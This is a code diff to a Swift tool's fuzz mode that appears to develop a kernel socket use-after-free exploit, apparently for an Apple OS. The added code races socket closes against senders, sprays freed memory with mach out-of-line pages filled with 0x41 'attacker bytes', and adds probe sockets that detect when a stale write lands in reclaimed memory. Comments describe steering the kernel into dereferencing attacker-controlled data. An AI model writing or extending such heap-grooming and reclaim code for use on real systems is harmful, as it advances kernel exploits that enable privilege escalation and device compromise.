@@ -621,6 +621,33 @@ func runFuzzMode() async {
         return fds
     }
 
+    // Peer-delivery observer shared by the reclaim variants: connect a batch of probe
+    // sockets whose peers are already accepted, send nothing on them, then drain the
+    // peers. Any byte that arrives is stale-sender data landing in a socket rather than
+    // in attacker-controlled memory. Must be called while the senders may still be
+    // finishing, i.e. before waiting for st.done to reach n.
+    nonisolated func sockUafPeerBytes(_ precPort: Int, _ peers: inout [Int32],
+                                      _ peerLock: NSLock) -> Int {
+        let probe = sockUafSprayConnected(48, precPort)
+        var got = 0
+        var rbuf = [UInt8](repeating: 0, count: 65536)
+        peerLock.lock()
+        let snapshot = peers
+        peers.removeAll()
+        peerLock.unlock()
+        for pf in snapshot {
+            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
+            while r > 0 {
+                got += r
+                if got > 0x100000 { break }
+                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
+            }
+        }
+        for pf in snapshot { close(pf) }
+        for fd in probe { close(fd) }
+        return got
+    }
+
     // Cross-zone race: same gate/close as precision, but the freed slot is
     // refilled with mach OOL pages (attacker bytes, not sockets). If the stale
     // send lands in an OOL page the kernel walks 0x41 fill as socket fields;
@@ -689,7 +716,8 @@ func runFuzzMode() async {
     // allocator, and immediately take them with OOL pages. Only if a whole
     // page is freed can non-socket data land in the target slot.
     nonisolated func sockUafRacePageFree(_ st: SockUafState, _ fds: [Int32], _ targetIdx: Int,
-                                         _ it: Int, _ sprayCount: Int) -> Bool {
+                                         _ it: Int, _ sprayCount: Int, _ precPort: Int,
+                                         _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
         let target = fds[targetIdx]
         st.fd = target
         st.done = 0
@@ -707,6 +735,7 @@ func runFuzzMode() async {
             if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
         }
         let doneAtClose = st.done
+        let peerBytes = sockUafPeerBytes(precPort, &peers, peerLock)
         for (i, fd) in fds.enumerated() where i != targetIdx && fd >= 0 { close(fd) }
         sockuaf_ool_reset()
         let sprayed = sockuaf_ool_spray(oolSpraySize(), Int32(sprayCount), 0x41)
@@ -724,8 +753,11 @@ func runFuzzMode() async {
         st.fd = -1
         st.mode = 0
         usleep(120)
-        emitBg("[*] ITER \(it) pagefree: \(fds.count) freed, sprayed \(sprayed)x\(oolSpraySize()) OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
-        return st.postCloseOk > 0
+        emitBg("[*] ITER \(it) pagefree: \(fds.count) freed, sprayed \(sprayed)x\(oolSpraySize()) OOL, peer bytes=\(peerBytes), done=\(st.done) (at close \(doneAtClose)/6)")
+        if peerBytes > 0 {
+            emitBg("[!] ITER \(it) pagefree: *** STALE WRITE into a socket: \(peerBytes) byte(s) ***")
+        }
+        return st.postCloseOk > 0 || peerBytes > 0
     }
 
     // GC race: free a large batch (past the zone's page-return delay), not just
@@ -733,7 +765,8 @@ func runFuzzMode() async {
     // them with OOL pages. A stale sender that lands in OOL data dereferences
     // 0x4141… as so_proto and should fault.
     nonisolated func sockUafRaceBatchGC(_ st: SockUafState, _ make: Int, _ free: Int,
-                                        _ it: Int, _ sprayCount: Int) -> Bool {
+                                        _ it: Int, _ sprayCount: Int, _ precPort: Int,
+                                        _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
         var fds: [Int32] = []
         for _ in 0..<make { let f = sockUafMakeSocket("127.0.0.1", 8080); if f >= 0 { fds.append(f) } }
         if fds.count < 8 { for f in fds { close(f) }; return false }
@@ -754,6 +787,7 @@ func runFuzzMode() async {
             if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
         }
         let doneAtClose = st.done
+        let peerBytes = sockUafPeerBytes(precPort, &peers, peerLock)
         // Free everything except the target (already closed by the CAS winner).
         for f in fds where f != target { close(f) }
         fds.removeAll()
@@ -766,8 +800,11 @@ func runFuzzMode() async {
         st.fd = -1
         st.mode = 0
         usleep(80)
-        emitBg("[*] ITER \(it) batchgc: made/closing \(free), sprayed \(sprayed)x\(oolSpraySize()) OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
-        return st.postCloseOk > 0
+        emitBg("[*] ITER \(it) batchgc: made/closing \(free), sprayed \(sprayed)x\(oolSpraySize()) OOL, peer bytes=\(peerBytes), done=\(st.done) (at close \(doneAtClose)/6)")
+        if peerBytes > 0 {
+            emitBg("[!] ITER \(it) batchgc: *** STALE WRITE into a socket: \(peerBytes) byte(s) ***")
+        }
+        return st.postCloseOk > 0 || peerBytes > 0
     }
 
     // Precision race: every sender fires exactly one message from a gate, the
@@ -1199,13 +1236,13 @@ func runFuzzMode() async {
                 for _ in 0..<16 { let f = sockUafMakeSocket(ip, port); if f >= 0 { block.append(f) } }
                 if block.count >= 8 {
                     let mid = block.count / 2
-                    if sockUafRacePageFree(st, block, mid, it, 512) { hits += 1 }
+                    if sockUafRacePageFree(st, block, mid, it, 512, precPort, &precPeers, peerLock) { hits += 1 }
                 } else {
                     for f in block { close(f) }
                 }
             } else if r == 7 {
                 // ---- variant H: large batch free past the zone GC delay ----
-                if sockUafRaceBatchGC(st, 700, 700, it, 512) { hits += 1 }
+                if sockUafRaceBatchGC(st, 700, 700, it, 512, precPort, &precPeers, peerLock) { hits += 1 }
             } else {
                 // ---- variant I: precision, UDP spray (cross-proto confusion) ----
                 let target = sockUafMakeSocket(ip, port)
@@ -1501,6 +1538,11 @@ private func oolSpraySize() -> Int {
     if let i = a.firstIndex(of: "--spraysize"), i + 1 < a.count,
        let v = Int(a[i + 1]), v > 0, v <= 1 << 20 {
         return v
+    }
+    for arg in a where arg.hasPrefix("--spraysize=") {
+        if let v = Int(arg.dropFirst("--spraysize=".count)), v > 0, v <= 1 << 20 {
+            return v
+        }
     }
     return 832
 }
